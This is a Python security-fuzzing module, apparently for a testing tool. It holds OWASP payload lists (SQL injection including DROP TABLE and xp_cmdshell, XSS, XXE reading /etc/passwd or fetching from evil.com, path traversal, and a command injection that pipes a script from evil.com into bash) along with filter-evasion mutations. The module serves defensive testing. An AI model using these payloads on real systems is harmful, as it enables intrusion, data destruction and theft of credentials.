"""
Security-Focused Fuzzing Framework for TestMaster
Implements OWASP Top 10 vulnerability testing patterns
"""

import random
import string
import re
import base64
from typing import Any, Dict, List, Optional, Tuple, Callable
from dataclasses import dataclass
from enum import Enum


class VulnerabilityType(Enum):
    """OWASP vulnerability categories"""
    INJECTION = "injection"
    BROKEN_AUTH = "broken_authentication"
    SENSITIVE_DATA = "sensitive_data_exposure"
    XXE = "xml_external_entities"
    BROKEN_ACCESS = "broken_access_control"
    SECURITY_MISCONFIG = "security_misconfiguration"
    XSS = "cross_site_scripting"
    INSECURE_DESER = "insecure_deserialization"
    KNOWN_VULNS = "using_known_vulnerabilities"
    INSUFFICIENT_LOG = "insufficient_logging"


@dataclass
class SecurityPayload:
    """Security test payload"""
    category: VulnerabilityType
    payload: str
    description: str
    severity: str  # critical, high, medium, low
    cwe_id: Optional[str] = None


@dataclass
class VulnerabilityReport:
    """Security vulnerability finding"""
    type: VulnerabilityType
    input_used: str
    response: Any
    confidence: float  # 0.0 to 1.0
    severity: str
    remediation: str
    cwe_id: Optional[str] = None


class OWASPPayloads:
    """Collection of OWASP attack payloads"""
    
    SQL_INJECTION = [
        "' OR '1'='1",
        "'; DROP TABLE users--",
        "1' UNION SELECT NULL--",
        "admin'--",
        "' OR 1=1--",
        "1' AND '1'='2",
        "' WAITFOR DELAY '00:00:05'--",
        "'; EXEC xp_cmdshell('dir')--"
    ]
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"
    ]
    
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/data">]>',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]>'
    ]
    
    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd"
    ]
    
    COMMAND_INJECTION = [
        "; ls -la",
        "| whoami",
        "& net user",
        "`cat /etc/passwd`",
        "$(curl evil.com/shell.sh | bash)",
        "; ping -c 10 127.0.0.1",
        "|| sleep 10"
    ]
    
    LDAP_INJECTION = [
        "*",
        "*)(&",
        "*)(uid=*",
        "*)(|(uid=*",
        "admin*",
        "*)(objectClass=*"
    ]
    
    HEADER_INJECTION = [
        "X-Forwarded-For: 127.0.0.1",
        "X-Real-IP: 127.0.0.1",
        "Referer: evil.com",
        "User-Agent: ' OR 1=1--",
        "Cookie: admin=true",
        "Host: evil.com"
    ]


class SecurityFuzzer:
    """Advanced security fuzzing engine"""
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        self.config = config or {}
        self.payloads = OWASPPayloads()
        self.findings = []
        self.test_history = []
        
    def generate_payloads(self, vuln_type: VulnerabilityType) -> List[SecurityPayload]:
        """Generate security test payloads"""
        payloads = []
        
        if vuln_type == VulnerabilityType.INJECTION:
            for p in self.payloads.SQL_INJECTION:
                payloads.append(SecurityPayload(
                    category=vuln_type,
                    payload=p,
                    description="SQL Injection attempt",
                    severity="critical",
                    cwe_id="CWE-89"
                ))
            for p in self.payloads.COMMAND_INJECTION:
                payloads.append(SecurityPayload(
                    category=vuln_type,
                    payload=p,
                    description="Command Injection attempt",
                    severity="critical",
                    cwe_id="CWE-78"
                ))
                
        elif vuln_type == VulnerabilityType.XSS:
            for p in self.payloads.XSS_PAYLOADS:
                payloads.append(SecurityPayload(
                    category=vuln_type,
                    payload=p,
                    description="Cross-Site Scripting attempt",
                    severity="high",
                    cwe_id="CWE-79"
                ))
                
        elif vuln_type == VulnerabilityType.XXE:
            for p in self.payloads.XXE_PAYLOADS:
                payloads.append(SecurityPayload(
                    category=vuln_type,
                    payload=p,
                    description="XML External Entity attempt",
                    severity="high",
                    cwe_id="CWE-611"
                ))
                
        elif vuln_type == VulnerabilityType.BROKEN_ACCESS:
            for p in self.payloads.PATH_TRAVERSAL:
                payloads.append(SecurityPayload(
                    category=vuln_type,
                    payload=p,
                    description="Path Traversal attempt",
                    severity="high",
                    cwe_id="CWE-22"
                ))
                
        return payloads
    
    def mutate_payload(self, payload: str, strategy: str = "random") -> str:
        """Mutate payload for evasion"""
        if strategy == "encoding":
            # URL encoding
            return ''.join(f'%{ord(c):02x}' if random.random() > 0.5 else c 
                          for c in payload)
        elif strategy == "case":
            # Random case
            return ''.join(c.upper() if random.random() > 0.5 else c.lower() 
                          for c in payload)
        elif strategy == "unicode":
            # Unicode encoding
            return payload.encode('unicode_escape').decode('ascii')
        elif strategy == "base64":
            # Base64 encoding
            return base64.b64encode(payload.encode()).decode()
        else:
            return payload
    
    def test_endpoint(self, endpoint: Callable, payloads: List[SecurityPayload]) -> List[VulnerabilityReport]:
        """Test endpoint with security payloads"""
        findings = []
        
        for payload in payloads:
            try:
                # Test with original payload
                response = endpoint(payload.payload)
                vuln = self._analyze_response(response, payload)
                if vuln:
                    findings.append(vuln)
                
                # Test with mutated payloads
                for strategy in ["encoding", "case", "unicode"]:
                    mutated = self.mutate_payload(payload.payload, strategy)
                    response = endpoint(mutated)
                    vuln = self._analyze_response(response, payload, mutated)
                    if vuln:
                        findings.append(vuln)
                        
            except Exception as e:
                # Errors might indicate vulnerability
                if self._is_suspicious_error(str(e), payload):
                    findings.append(VulnerabilityReport(
                        type=payload.category,
                        input_used=payload.payload,
                        response=str(e),
                        confidence=0.7,
                        severity=payload.severity,
                        remediation=self._get_remediation(payload.category),
                        cwe_id=payload.cwe_id
                    ))
                    
        self.findings.extend(findings)
        return findings
    
    def _analyze_response(self, response: Any, payload: SecurityPayload, 
                         actual_input: str = None) -> Optional[VulnerabilityReport]:
        """Analyze response for vulnerabilities"""
        response_str = str(response)
        input_used = actual_input or payload.payload
        
        # Check for reflected input (XSS)
        if payload.category == VulnerabilityType.XSS:
            if input_used in response_str or payload.payload in response_str:
                return VulnerabilityReport(
                    type=payload.category,
                    input_used=input_used,
                    response=response_str[:200],
                    confidence=0.9,
                    severity=payload.severity,
                    remediation="Implement output encoding and CSP headers",
                    cwe_id=payload.cwe_id
                )
        
        # Check for SQL error messages
        if payload.category == VulnerabilityType.INJECTION:
            sql_errors = [
                r'SQL syntax.*MySQL',
                r'Warning.*mysql_',
                r'ORA-[0-9]{5}',
                r'PostgreSQL.*ERROR',
                r'Driver.*SQL Server',
                r'SQLite.*error'
            ]
            for pattern in sql_errors:
                if re.search(pattern, response_str, re.IGNORECASE):
                    return VulnerabilityReport(
                        type=payload.category,
                        input_used=input_used,
                        response=response_str[:200],
                        confidence=0.95,
                        severity="critical",
                        remediation="Use parameterized queries",
                        cwe_id="CWE-89"
                    )
        
        # Check for path traversal success
        if payload.category == VulnerabilityType.BROKEN_ACCESS:
            sensitive_files = ['root:', 'daemon:', '/etc/passwd', 'boot.ini']
            for marker in sensitive_files:
                if marker in response_str:
                    return VulnerabilityReport(
                        type=payload.category,
                        input_used=input_used,
                        response=response_str[:200],
                        confidence=0.95,
                        severity="critical",
                        remediation="Validate and sanitize file paths",
                        cwe_id="CWE-22"
                    )
        
        return None
    
    def _is_suspicious_error(self, error: str, payload: SecurityPayload) -> bool:
        """Check if error indicates vulnerability"""
        suspicious_patterns = [
            r'syntax error',
            r'unexpected token',
            r'permission denied',
            r'file not found',
            r'cannot access',
            r'illegal character',
            r'invalid input'
        ]
        
        for pattern in suspicious_patterns:
            if re.search(pattern, error, re.IGNORECASE):
                return True
        return False
    
    def _get_remediation(self, vuln_type: VulnerabilityType) -> str:
        """Get remediation advice"""
        remediations = {
            VulnerabilityType.INJECTION: "Use parameterized queries and input validation",
            VulnerabilityType.XSS: "Implement output encoding and Content Security Policy",
            VulnerabilityType.XXE: "Disable XML external entity processing",
            VulnerabilityType.BROKEN_ACCESS: "Implement proper access controls and path validation",
            VulnerabilityType.BROKEN_AUTH: "Use secure session management and MFA",
            VulnerabilityType.SENSITIVE_DATA: "Encrypt sensitive data at rest and in transit",
            VulnerabilityType.SECURITY_MISCONFIG: "Harden security configurations",
            VulnerabilityType.INSECURE_DESER: "Avoid deserialization of untrusted data",
            VulnerabilityType.KNOWN_VULNS: "Keep dependencies updated",
            VulnerabilityType.INSUFFICIENT_LOG: "Implement comprehensive logging and monitoring"
        }
        return remediations.get(vuln_type, "Review security best practices")
    
    def generate_report(self) -> Dict[str, Any]:
        """Generate security testing report"""
        if not self.findings:
            return {"status": "No vulnerabilities found"}
        
        by_type = {}
        by_severity = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        
        for finding in self.findings:
            if finding.type.value not in by_type:
                by_type[finding.type.value] = []
            by_type[finding.type.value].append({
                'input': finding.input_used,
                'confidence': finding.confidence,
                'severity': finding.severity,
                'cwe': finding.cwe_id
            })
            by_severity[finding.severity] += 1
        
        return {
            'total_findings': len(self.findings),
            'by_severity': by_severity,
            'by_type': by_type,
            'top_risks': self._get_top_risks(),
            'recommendations': self._get_recommendations()
        }
    
    def _get_top_risks(self) -> List[str]:
        """Get top security risks"""
        critical = [f for f in self.findings if f.severity == "critical"]
        return [f"{f.type.value}: {f.remediation}" for f in critical[:5]]
    
    def _get_recommendations(self) -> List[str]:
        """Get security recommendations"""
        recs = set()
        for finding in self.findings:
            recs.add(finding.remediation)
        return list(recs)[:10]